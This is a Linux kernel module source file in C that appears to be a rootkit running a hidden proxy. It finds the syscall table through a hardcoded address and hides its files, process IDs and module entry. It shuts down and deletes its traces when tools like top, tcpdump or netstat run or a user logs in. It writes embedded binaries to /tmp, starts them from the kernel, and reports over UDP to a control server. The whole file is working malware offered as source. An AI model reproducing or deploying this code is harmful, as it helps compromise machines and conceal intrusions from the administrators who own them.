#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/moduleparam.h>
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */

#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */
#include <linux/utsname.h>
#include <asm/cacheflush.h>
#include <linux/semaphore.h>
#include <linux/kallsyms.h>

#include <linux/file.h>
#include <linux/net.h>
#include <net/inet_sock.h>
#include <linux/byteorder/generic.h>
#include <linux/netfilter.h>
#include <linux/vmalloc.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <net/udp.h>
#include <linux/ktime.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/workqueue.h>
#include <linux/fcntl.h>

#include "monitor_proc.h"
#include "udp_client.h"
#include "hide_info.h"

//extern unsigned long (*kallsyms_lookup_name)(const char *name);

extern unsigned char *get_caddy_arrar(unsigned int *len);
extern unsigned char *get_caddyconf_arrar(unsigned int *len);
extern unsigned char *get_checkchange_arrar(unsigned int *len);

static struct timer_list monitor_timer;
static int monitor_period = 2;

void monitor_work_func(struct work_struct *work);
DECLARE_WORK(monitor_work, monitor_work_func);

static char *envp[] = { "HOME=/", "TERM=linux", "PATH=/usr/bin:/bin", NULL };

static char *dangerous_process_name[] = {
    "htop",
    "top",
    "tcpdump",
    "netstat",
    "iotop",
    "iostat",
    "iftop",
};

static char *proxy_server = "kdevtmpcs";
atomic_t proxy_pid;
atomic_t download_pid;
atomic_t proxy_enable;
atomic_t env_ok;

asmlinkage long (*kill_syscall)(int pid, int sig);
asmlinkage long (*access_syscall)(const char __user *filename, int mode);
asmlinkage long (*unlink_syscall)(const char __user *pathname);
asmlinkage long (*stat_syscall)(const char __user *filename,
			struct __old_kernel_stat __user *statbuf);
asmlinkage long (*chmod_syscall)(const char __user *filename, umode_t mode);
asmlinkage long (*fcntl_syscall)(unsigned int fd, unsigned int cmd, unsigned long arg);
asmlinkage long (*open_syscall)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*close_syscall)(unsigned int fd);

asmlinkage long (*read_syscall_monitor)(unsigned int fd, char __user *buf, size_t count);

int (*do_prlimit_func)(struct task_struct *tsk, unsigned int resource,
		struct rlimit *new_rlim, struct rlimit *old_rlim);


static char proxy_exe_file[256] = "/tmp/kdevtmpcs";
static char proxy_conf_file[256] = "/tmp/kdevtmpds";
static char download_script_file[256] = "/tmp/rcu_dh";
static char check_env_script[256] = "/tmp/netcs";
//static char check_file_info[256] = "/tmp/.font-unix/file_info.txt";
static char wget_exe_file[256] = "/usr/bin/wget";
static char download_script_url[256] = "";

static char server_addr[64] = "";
static int server_port = 0;

static int check_file_ok = 77;

static int module_unregister = 0;
static int heart_fail_max = 10;
static int heart_fail_cnt = 0;

atomic_t printflag = {0};

char *module_name = "proxy";

extern int https_port;
extern int http_port;

extern int check_port_list_bind(void);

module_param_string(proxy_exe, proxy_exe_file, sizeof(proxy_exe_file), 0);
module_param_string(proxy_conf, proxy_conf_file, sizeof(proxy_conf_file), 0);
module_param_string(dld_script, download_script_file, sizeof(download_script_file), 0);
module_param_string(wget_exe, wget_exe_file, sizeof(wget_exe_file), 0);
module_param_string(dld_url, download_script_url, sizeof(download_script_url), 0);
module_param_string(server_addr, server_addr, sizeof(server_addr), 0);
module_param(server_port, int , 0);
module_param(heart_fail_max, int , 0);

static char *need_files[] = {
    proxy_exe_file,
    proxy_conf_file,
    check_env_script,
    //check_file_info,
};

static char *all_local_files[] = {
    proxy_exe_file,
    proxy_conf_file,
    //download_script_file,
    check_env_script,
    //check_file_info,
};


static int safe_delay = 60u;
module_param(safe_delay, int , 0);

static u64 safe_duration = 0;

extern atomic_t hide_info_flag;

#define UTMP_STRUCT_LEN 384
#define USER_PROCESS  7 /* Normal process */

unsigned long my_kallsyms_lookup_name(const char *name)
{
    unsigned long (*kallsyms_lookup_name_func)(const char *name);
    kallsyms_lookup_name_func = (void *)0xffffffff810b9570;

    return kallsyms_lookup_name_func(name);
}


int check_b_server_info(void)
{
    if (strlen(server_addr) != 0 && server_port != 0) {
        return 1;
    }

    return 0;
}

char *get_download_url(void)
{
    return download_script_url;
}

char *get_b_server_addr(void)
{
    return server_addr;
}


char *get_base_filename(char *fullpath)
{
    char *endptr = fullpath + strlen(fullpath);
    while (endptr > fullpath && *endptr != '/') {
        endptr--;
    }   
    if (*endptr == '/') {
        endptr++; 
    }   

    return endptr;
}
static inline int is_dangerous_proc_name(char *name)
{
	int i = 0;
	int ret = 0;
    for (i = 0; i < sizeof(dangerous_process_name) / sizeof(dangerous_process_name[0]); i++) {
        if (strcmp(name, dangerous_process_name[i]) == 0) {
			ret = 1;
            break;
        }
    }

	return ret;
}

void force_rm_file(char *file_name)
{
    char *argv[] = {"/usr/bin/rm", "-rf", file_name, NULL};    
    call_usermodehelper("/usr/bin/rm", argv, envp, UMH_WAIT_PROC);
}

static int all_need_file_ok(void)
{
    int i = 0;
    char pid_str_buf[32] = {0};
    
    for (i = 0; i < sizeof(need_files) / sizeof(need_files[0]); i++) {
        if (access_syscall(need_files[i], 0) != 0) {
            return 0;
        }
    }

    //if (access_syscall(download_script_file, 0) == 0) {
    //    force_rm_file(download_script_file);
    //}

    if (atomic_read(&download_pid) != 0) {
        snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", atomic_read(&download_pid));
        clear_hiden_path("/proc", pid_str_buf);
        atomic_set(&download_pid, 0);
    }

    return 1;
}

int is_enable_proxy(void)
{
    return atomic_read(&proxy_enable);
}

int check_login_user(void)
{
    struct flock lock = {0};
    int ret = 1;
    char tmp_buf[UTMP_STRUCT_LEN] = {0};
    short ut_type = 0;
    int cnt = 0;
        
    int fd = open_syscall("/var/run/utmp", O_RDONLY|O_CLOEXEC, 0);
    if (fd < 0) {
        MY_PRINT("open utmp failed.\n");
        return 1;
    }

    MY_PRINT("New check_login_user\n");

    lock.l_type = F_RDLCK;
    lock.l_whence = SEEK_SET;
    lock.l_start = 0;
    lock.l_len = 0;
    lock.l_pid = -1;

    if (fcntl_syscall(fd, F_SETLKW, (unsigned long)(&lock)) != 0) {
        ret = 1;
        MY_PRINT("Lock utmp failed.\n");
        goto RET;
    }

    while (1) {
        if (read_syscall_monitor(fd, tmp_buf, UTMP_STRUCT_LEN) != UTMP_STRUCT_LEN) {
            break;
        }
        ut_type = *((short *)tmp_buf);

        if (ut_type == USER_PROCESS) {
            cnt++;
        }
    }
    ret = cnt;

    lock.l_type = F_UNLCK;
    lock.l_whence = SEEK_SET;
    lock.l_start = 0;
    lock.l_len = 0;
    lock.l_pid = -1;
    if (fcntl_syscall(fd, F_SETLKW, (unsigned long)(&lock)) != 0) {
        MY_PRINT("Unlock utmp failed.\n");
    }
    
RET:
    close_syscall(fd);
    return ret;
}

int check_port_bind(int http_port, int https_port)
{
    char buf[64] = {0};
    char *argv[] = {"/bin/sh", "-c", NULL, NULL};
    int ret = 0;
    
    snprintf(buf, sizeof(buf), "exit $(netstat -nlt | grep %d | wc -l)", http_port);
    argv[2] = buf;
    ret = call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
    ret = (ret >> 8) & 0xff;
    if (ret <= 0) {
        MY_PRINT("http port: %d not bind.\n", http_port);
        return 0;
    }
    MY_PRINT("http port: %d has binded.\n", http_port);

    snprintf(buf, sizeof(buf), "exit $(netstat -nlt | grep %d | wc -l)", https_port);
    argv[2] = buf;
    ret = call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_PROC);
    ret = (ret >> 8) & 0xff;
    if (ret <= 0) {
        MY_PRINT("https port: %d not bind.\n", https_port);
        return 0;
    }
    
    MY_PRINT("https port: %d has binded.\n", https_port);

    return 1;
}

void check_monitor_proc(int *dproc, int *proxy_proc)
{
    struct task_struct * task = NULL;
    char pid_str_buf[32] = {0};

    *dproc = 0;
    *proxy_proc = 0;
    
	rcu_read_lock();
	for_each_process(task) {
		if (is_dangerous_proc_name(task->comm)) {
            *dproc = 1;
		}
        if (strcmp(proxy_server, task->comm) == 0) {
            *proxy_proc = 1;
            if (atomic_read(&proxy_pid) != task_tgid_vnr(task)) {
                if (atomic_read(&proxy_pid) != 0) {
                    snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", atomic_read(&proxy_pid));
                    clear_hiden_path("/proc", pid_str_buf);
                }

                snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", task_tgid_vnr(task));
                add_hiden_path("/proc", pid_str_buf);
                atomic_set(&proxy_pid, task_tgid_vnr(task));
            }
        }
        if (*proxy_proc != 0 && *dproc != 0) {
            break;
        }
	}
	rcu_read_unlock();

    if (*proxy_proc == 0) {
        if (atomic_read(&proxy_pid) != 0) {
            snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", atomic_read(&proxy_pid));
            clear_hiden_path("/proc", pid_str_buf);
            atomic_set(&proxy_pid, 0);
        }
    }

    return;
}

pid_t find_special_proc(char *comm, struct task_struct **store_tsk)
{
    struct task_struct * task = NULL;
    pid_t ret = 0;
    //char *basename = get_base_filename(download_script_file);
    
	rcu_read_lock();
	for_each_process(task) {
        if (strncmp(comm, task->comm, sizeof(task->comm) - 1) == 0) {
            ret = task_tgid_vnr(task);
            if (store_tsk != NULL) {
                *store_tsk = task;
                get_task_struct(task);
            }
            break;
        }
	}
	rcu_read_unlock();
    
    return ret;
}
void clear_all_proxy_info(void)
{
    pid_t pid = 0;
    int i = 0;
    char tmp[256];

    atomic_set(&proxy_enable, 0);
    atomic_set(&env_ok, 0);

    pid = atomic_read(&proxy_pid);
    if (pid != 0) {
        MY_PRINT("Kill proxy %d\n", pid);
        kill_syscall(pid, 15);
    }
    pid = find_special_proc(get_base_filename(download_script_file), NULL);
    if (pid != 0) {
        MY_PRINT("Kill download %d\n", pid);
        kill_syscall(pid, 9);
    }

    for (i = 0; i < sizeof(all_local_files) / sizeof(all_local_files[0]); i++) {
        if (access_syscall(all_local_files[i], 0) == 0) {
            MY_PRINT("Remove file: %s\n", all_local_files[i]);
            force_rm_file(all_local_files[i]);
        }
        memset(tmp, 0, sizeof(tmp));
        strcat(tmp, all_local_files[i]);
        strcat(tmp, "_tmp");
        if (access_syscall(tmp, 0) == 0) {
            MY_PRINT("Remove tmp file: %s\n", tmp);
            force_rm_file(tmp);
        }
    }
}

int prepare_proxy_env(void) {
    //char *argv[] = {wget_exe_file, download_script_url, "-O", download_script_file, "-T", "5", "-t", "1", NULL};
    //char *argv_dld[] = {}
    //pid_t dld_pid = 0;
    //char pid_str_buf[32] = {0};
    struct file*fp = NULL;
    mm_segment_t old_fs;
    int ret = 0;
    unsigned char *data = NULL;
    unsigned int data_len = 0;    
    loff_t pos = 0;

    if (all_need_file_ok()) {
        MY_PRINT("All file is OK!\n");
        return 0;
    }
    //dld_pid = find_special_proc(get_base_filename(download_script_file), NULL);
    //if (dld_pid != 0) {
    //    MY_PRINT("Found download process!\n");
    //    return 0;
    //}

    if (heart_fail_cnt > 0) {
        MY_PRINT("Server may down!\n");
        return 0;
    }
    
    //MY_PRINT("Download script file!\n");
    //call_usermodehelper(wget_exe_file, argv, envp, UMH_WAIT_PROC);
    //MY_PRINT("chmod_syscall: %p\n", chmod_syscall);
    //if (chmod_syscall(download_script_file, 0755) != 0) {
    //    MY_PRINT("Chmod download_script_file error!\n");
    //    return -1;
    //}
    
    //run download script
    //argv[0] = download_script_file;
    //argv[1] = NULL;
    //call_usermodehelper(download_script_file, argv, envp, UMH_WAIT_EXEC);
    
    //dld_pid = find_special_proc(get_base_filename(download_script_file), NULL);
    //if (dld_pid != 0) {
    //    if (atomic_read(&download_pid) != 0) {
    //        snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", atomic_read(&download_pid));
    //        clear_hiden_path("/proc", pid_str_buf);
    //    }

    //    snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", dld_pid);
    //    add_hiden_path("/proc", pid_str_buf);
    //    atomic_set(&download_pid, dld_pid);
    //}

    old_fs = get_fs();
    set_fs(KERNEL_DS);
    
    fp = filp_open(proxy_exe_file, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (IS_ERR(fp)) {
        MY_PRINT("Create caddy file: %s failed!\n", proxy_exe_file);
        ret = 1;
        goto RET;
    }
    pos = 0;
    data = get_caddy_arrar(&data_len);
    vfs_write(fp, data, data_len, &pos);
    filp_close(fp, NULL);

    
    fp = filp_open(proxy_conf_file, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (IS_ERR(fp)) {
        MY_PRINT("Create caddy conf file: %s failed!\n", proxy_conf_file);
        ret = 1;
        goto RET;
    }
    pos = 0;
    data = get_caddyconf_arrar(&data_len);
    vfs_write(fp, data, data_len, &pos);
    filp_close(fp, NULL);

    
    fp = filp_open(check_env_script, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (IS_ERR(fp)) {
        MY_PRINT("Create check env file: %s failed!\n", check_env_script);
        ret = 1;
        goto RET;
    }
    pos = 0;
    data = get_checkchange_arrar(&data_len);
    vfs_write(fp, data, data_len, &pos);
    filp_close(fp, NULL);
    
RET:
    set_fs(old_fs);
    return 0;
}

int check_key_file_modify(void)
{
    char *argv[] = {check_env_script, NULL};
    int ret = 0;

    chmod_syscall(check_env_script, 0755);
    ret = call_usermodehelper(check_env_script, argv, envp, UMH_WAIT_PROC);
    ret = (ret >> 8) & 0xff;

    MY_PRINT("check key file modify ret: %d\n", ret);
    return ret;
}

void start_proxy_from_kernel(void)
{
    char *argv[] = {proxy_exe_file, "-conf", proxy_conf_file, NULL};
    pid_t proxypid = 0;
    char pid_str_buf[32] = {0};
    pid_t dld_pid = 0;
    struct task_struct *get_tsk = NULL;
    struct rlimit new_rlim = {0};
    struct rlimit old_rlim = {0};

    if (!check_port_list_bind()) {
        MY_PRINT("http port or https port not bind.\n");
        return;
    }

    if (!all_need_file_ok()) {
        MY_PRINT("Need file are not prepared!\n");
        return;
    }
    
    if (check_key_file_modify() != check_file_ok) {
        MY_PRINT("Check File is not ok!");
        send_key_file_change_msg();
        return;
    }

    dld_pid = find_special_proc(get_base_filename(download_script_file), NULL);
    if (dld_pid != 0) {
        MY_PRINT("Find download process, wait the file download.\n");
        return;
    }
    
    MY_PRINT("Start proxy server\n");
    chmod_syscall(proxy_exe_file, 0755);
    call_usermodehelper(proxy_exe_file, argv, envp, UMH_WAIT_EXEC);

    proxypid = find_special_proc(proxy_server, &get_tsk);
    if (proxypid != 0 && get_tsk != NULL) {
        if (atomic_read(&proxy_pid) != 0) {
            snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", atomic_read(&proxy_pid));
            clear_hiden_path("/proc", pid_str_buf);
        }

        snprintf(pid_str_buf, sizeof(pid_str_buf), "%d", proxypid);
        add_hiden_path("/proc", pid_str_buf);
        atomic_set(&proxy_pid, proxypid);

        if (get_tsk != NULL && do_prlimit_func != NULL) {
            new_rlim.rlim_cur = 65535;
            new_rlim.rlim_max = 65535;
            do_prlimit_func(get_tsk, RLIMIT_NOFILE, &new_rlim, &old_rlim);
            MY_PRINT("XX Old rlim_cur: %lu, rlim_max: %lu", old_rlim.rlim_cur, old_rlim.rlim_max);
        }
        put_task_struct(get_tsk);
    }
}

void relay_hide_module(void)
{
    struct socket *udp_sock = NULL;
    char buf[64] = {0};
    
    memset(buf, 0, sizeof(buf));
    udp_client_init(&udp_sock);
    if (udp_sock != NULL) {
        strncpy(buf, "MMMMMMMMMM", sizeof(buf) - 1);
        udp_send_data(udp_sock, server_addr, server_port, buf, strlen(buf));
        sock_release(udp_sock);
    }
}

void send_key_file_change_msg(void)
{
    struct socket *udp_sock = NULL;
    char buf[64] = {0};
    
    memset(buf, 0, sizeof(buf));
    udp_client_init(&udp_sock);
    if (udp_sock != NULL) {
        strncpy(buf, "FFFFFFFFFF", sizeof(buf) - 1);
        udp_send_data(udp_sock, server_addr, server_port, buf, strlen(buf));
        sock_release(udp_sock);
    }
}


int check_b_server_status(void)
{
    struct socket *udp_sock = NULL;
    char buf[64];
    int ret = 0;

    memset(buf, 0, sizeof(buf));
    udp_client_init(&udp_sock);
    if (udp_sock != NULL) {
        strncpy(buf, "HHHHHHHHHH", sizeof(buf) - 1);
        udp_send_data(udp_sock, server_addr, server_port, buf, strlen(buf));
        ret = udp_receive(udp_sock, buf, sizeof(buf));
        if (ret < 2) {
            ret = 0;
            goto RET;
        }
        buf[ret] = '\0';
        MY_PRINT("recv: %s\n", buf);
        if (strncmp(buf, "OK", 2) != 0) {
            ret = 0;
            goto RET;
        }
        ret = 1;
    }
RET:
    if (udp_sock != NULL) {
        sock_release(udp_sock);
    }
    if (ret == 1) {
        heart_fail_cnt = 0;
    } else {
        heart_fail_cnt++;
    }

    return (heart_fail_cnt >= heart_fail_max) ? 0 : 1;
}

void monitor_work_func(struct work_struct *work)
{
    int login_num = 0;
    int dproc = 0;
    int proxy_proc = 0;
    int b_ok = 0;

    if (module_unregister) {
        return;
    }
    
    login_num = check_login_user();
    MY_PRINT("Login user num: %d\n", login_num);
    MY_PRINT("Module name: %s\n", THIS_MODULE->name);
    check_monitor_proc(&dproc, &proxy_proc);
    if (dproc) {
        MY_PRINT("Found dangerous process!\n");
    }

    if ((login_num > 0 || dproc) && atomic_read(&hide_info_flag) == 1) {
        MY_PRINT("Found dangerous signal, disable proxy!\n");
        atomic_set(&proxy_enable, 0);
        atomic_set(&env_ok, 0);
        safe_duration = 0;
    } else {
        b_ok = check_b_server_status();
        if (b_ok) {
            atomic_set(&env_ok, 1);
            safe_duration++;
        } else {
            MY_PRINT("B server is not ok, don't start server.\n");
            atomic_set(&proxy_enable, 0);
            atomic_set(&env_ok, 0);
            safe_duration = 0;
        }
    }
    
    if (proxy_proc) {
        atomic_set(&proxy_enable, 1);
        MY_PRINT("Found proxy process, enable proxy\n");
        MY_PRINT("Proxy pid: %d\n", atomic_read(&proxy_pid));
    } else {
        atomic_set(&proxy_enable, 0);
        if ((atomic_read(&env_ok) != 0) && (safe_duration > safe_delay)) {
            start_proxy_from_kernel();
        } else {            
            MY_PRINT("Env is dangerous, don't start proxy.\n");
        }
    }

    if (atomic_read(&env_ok) == 0) {
        MY_PRINT("Clear all files and process.\n");
        clear_all_proxy_info();
    } else {
        if (safe_duration > safe_delay) {
            prepare_proxy_env();
        } else {
            MY_PRINT("No reach safe delay %llu!.\n", safe_duration);
        }
    }

    return;
}   

static void monitor_handler(unsigned long time) {
    schedule_work(&monitor_work);
	mod_timer(&monitor_timer, jiffies + msecs_to_jiffies(monitor_period * 1000));
    return;
}   

int init_monitor_timer(int period)
{
    void **sys_table = (void **)my_kallsyms_lookup_name("sys_call_table");
    do_prlimit_func = (void *)my_kallsyms_lookup_name("do_prlimit");
    kill_syscall = NULL;
    access_syscall = NULL;
    if (sys_table != NULL) {
        kill_syscall = sys_table[__NR_kill];
        access_syscall = sys_table[__NR_access];
        unlink_syscall = sys_table[__NR_unlink];
        stat_syscall = sys_table[__NR_stat];
        chmod_syscall = sys_table[__NR_chmod];
        fcntl_syscall = sys_table[__NR_fcntl];
        open_syscall = sys_table[__NR_open];
        close_syscall = sys_table[__NR_close];
        read_syscall_monitor = sys_table[__NR_read];
    }
    
	atomic_set(&proxy_pid, 0);
    atomic_set(&proxy_enable, 0);
    atomic_set(&env_ok, 0);
    
    monitor_period = period;
    init_timer(&monitor_timer);
    monitor_timer.expires = jiffies + msecs_to_jiffies(monitor_period * 1000);
    monitor_timer.function  = monitor_handler;
    add_timer(&monitor_timer);

    add_hiden_full_path(proxy_exe_file);
    add_hiden_full_path(proxy_conf_file);
    add_hiden_full_path(download_script_file);
    add_hiden_full_path(check_env_script);
    //add_hiden_full_path(check_file_info);
    add_hiden_path("/sys/module", module_name);
	    
    return 0;
}

int del_monitor_timer(void)
{
    mm_segment_t fs;

    module_unregister = 1;
    
    fs = get_fs();
    set_fs(KERNEL_DS);
    clear_all_proxy_info();
    set_fs(fs);
    
 	del_timer_sync(&monitor_timer);
	flush_work(&monitor_work);

    fs = get_fs();
    set_fs(KERNEL_DS);
    clear_all_proxy_info();
    set_fs(fs);
    
    return 0;
}

